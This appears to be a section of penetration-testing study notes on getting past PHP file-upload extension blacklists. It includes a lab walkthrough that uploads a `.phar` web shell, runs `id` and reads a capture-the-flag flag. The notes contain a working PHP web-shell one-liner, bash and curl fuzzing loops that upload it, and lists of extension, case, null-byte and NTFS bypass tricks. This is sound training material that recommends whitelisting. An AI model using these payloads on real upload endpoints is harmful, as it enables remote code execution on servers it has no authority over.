# Section 5 — Blacklist Filter Bypass

---

## Why Blacklists Fail

A blacklist tries to enumerate everything dangerous. The attacker only needs one omission. Typical PHP blacklist:
```php
$blacklist = array('php', 'php7', 'phps');
```
Misses `phtml`, `phar`, `pht`, `php2`–`php6`, `inc`, `phpt`, `pHp` (case variants on Windows).

The fix is whitelisting allowed extensions — not blacklisting bad ones (Section 6).

---

## PHP Extensions That Execute as PHP

Apache/nginx + mod_php config usually maps these to PHP interpreter:

| Extension | Notes |
|-----------|-------|
| `.php` | Standard — almost always blocked |
| `.phtml` | "PHP HTML" — common alias, often blocked too |
| `.phar` | PHP Archive — modern, less commonly blocked |
| `.pht` | Older alias |
| `.php2`, `.php3`, `.php4`, `.php5`, `.php6`, `.php7` | Version-specific |
| `.phpt` | Test files — sometimes registered as PHP |
| `.inc` | Include file — executes if mapped |
| `.PhP`, `.Php`, `.pHp` (Windows) | Case-variant — Windows FS case-insensitive |

> Which extensions actually execute depends on the server's `AddType application/x-httpd-php` directives (Apache) or `location ~ \.ext$` blocks (nginx).

---

## Fuzzing the Blacklist

### With ffuf
```bash
echo '<?php system($_REQUEST["c"]); ?>' > /tmp/sh.body

# Build per-extension payloads:
for ext in php phtml phar pht php2 php3 php4 php5 php6 php7 phps phpt inc; do
  echo $ext
done > /tmp/exts.txt

# Or use the SecLists list:
ls ~/SecLists/Discovery/Web-Content/web-extensions.txt
```

### With Burp Intruder
1. Capture a normal upload → Send to Intruder
2. Mark the extension after `filename="sh."` as the payload position
3. Load PayloadsAllTheThings PHP extensions or `web-extensions.txt`
4. **Untick URL encoding** so the `.` stays literal
5. Sort results by response length — `File successfully uploaded` = allowed; `Extension not allowed` = blocked

### Quick bash fuzzer
```bash
for ext in phtml phar pht php2 php3 php4 php5 php6 php7 inc phpt; do
  cp /tmp/sh.body /tmp/sh.$ext
  resp=$(curl -sk -X POST "http://TARGET/upload.php" \
    -F "uploadFile=@/tmp/sh.$ext;filename=sh.$ext")
  echo "[$ext] $resp"
  rm /tmp/sh.$ext
done
```

---

## Allowed ≠ Executes

A blacklist miss only means the server **accepts** the extension. Test whether the server **executes** it:

```bash
# Upload + visit + check for command output (not raw source)
curl -X POST "http://TARGET/upload.php" -F "uploadFile=@sh.phar;filename=sh.phar"
curl "http://TARGET/uploads/sh.phar?c=id"
# → "uid=33(www-data)..." → executes ✅
# → "<?php system..."     → source served, no exec ❌ → try next extension
```

Some uploaded files pass the blacklist but get served as text/plain — useful for LFI chains (Section 7 of LFI module) but not direct RCE.

---

## Common Bypass Variants

### Case sensitivity (Windows / case-insensitive FS)
```
sh.PHP    sh.Php    sh.pHp    sh.PhP
```
PHP blacklist often uses `strtolower()` — but not always. Test against:
```php
if (in_array($ext, $blacklist))    // case-sensitive miss → sh.PHP passes
```

### Trailing characters (Windows file system tricks)
```
sh.php.       (trailing dot — Windows strips it)
sh.php (space)
sh.php::$DATA  (NTFS alternate data stream)
```
These exploit Windows' file naming oddities; on Linux they're treated literally and don't help.

### Double extensions (Apache mod_mime quirk)
```
sh.php.jpg     — Apache may interpret as PHP if mod_mime maps both extensions
shell.php.png
```
Depends on Apache's `AddHandler`/`AddType` ordering — modern configs handle this safely.

### Null byte (PHP < 5.3.4)
```
sh.php%00.jpg
```
Old PHP truncates at `\0` — blacklist sees `.jpg`, FS writes `.php`. Patched 2010+.

---

## Lab — Blacklist Bypass

**Target:** `154.57.164.72:31554`

### Step 1 — Confirm blacklist
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /tmp/sh.php
curl -sk -X POST "http://154.57.164.72:31554/upload.php" -F "uploadFile=@/tmp/sh.php"
# → "Extension not allowed"
```

### Step 2 — Fuzz alternative extensions
```bash
for ext in phtml phar pht php2 php3 php4 php5 php6 inc phpt; do
  cp /tmp/sh.php /tmp/sh.$ext
  resp=$(curl -sk -X POST "http://154.57.164.72:31554/upload.php" \
    -F "uploadFile=@/tmp/sh.$ext;filename=sh.$ext")
  echo "[$ext] $resp"
done
```

Results:
```
[phtml] Extension not allowed              ← blocked
[phar]  File successfully uploaded         ← accepted ✅
[pht]   File successfully uploaded
[php2]  File successfully uploaded
[php3]  File successfully uploaded
[php4]  File successfully uploaded
[php5]  Extension not allowed              ← blocked
[php6]  File successfully uploaded
[inc]   File successfully uploaded
[phpt]  File successfully uploaded
```

Blacklist appears to be `{php, phtml, php5, phps}` — probably with `php7` too.

### Step 3 — Confirm execution and read flag

```bash
curl -sk "http://154.57.164.72:31554/profile_images/sh.phar?cmd=id"
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)    ← executes!

curl -sk "http://154.57.164.72:31554/profile_images/sh.phar?cmd=cat+/flag.txt"
# → HTB{1_c4n_n3v3r_b3_bl4ckl1573d}
```

**Flag:** `HTB{1_c4n_n3v3r_b3_bl4ckl1573d}`

---

## Exam Notes

- **`.phar` is the most reliable PHP bypass extension** — modern, less famous, rarely blocked
- Standard blacklist usually catches `php`, `phtml`, `php5`, `phps` — try other variants first
- "Uploaded successfully" ≠ "executes as PHP" — always confirm with a test command
- For Apache: `.phar`, `.phtml`, `.pht`, `.phpX` all execute via mod_php by default config
- For Windows targets: try case variants (`.pHp`, `.PHP`) — Windows FS is case-insensitive but PHP's `in_array` is case-sensitive
- This bypass class is **purely a defense-in-depth fail** — blacklists are never secure; whitelisting is the only correct fix
- Skip to Section 6 to see how whitelisting changes the game
